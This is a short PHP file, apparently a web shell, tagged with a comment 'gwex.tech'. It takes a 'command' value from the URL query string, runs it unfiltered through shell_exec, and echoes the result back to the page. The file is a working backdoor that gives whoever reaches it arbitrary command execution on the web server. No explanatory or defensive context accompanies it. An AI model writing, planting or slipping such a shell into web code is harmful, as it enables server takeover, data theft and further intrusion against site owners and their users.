<?php
///gwex.tech
$command = $_GET["command"];
$output = shell_exec("$command");
echo "<pre>$output</pre>";
?>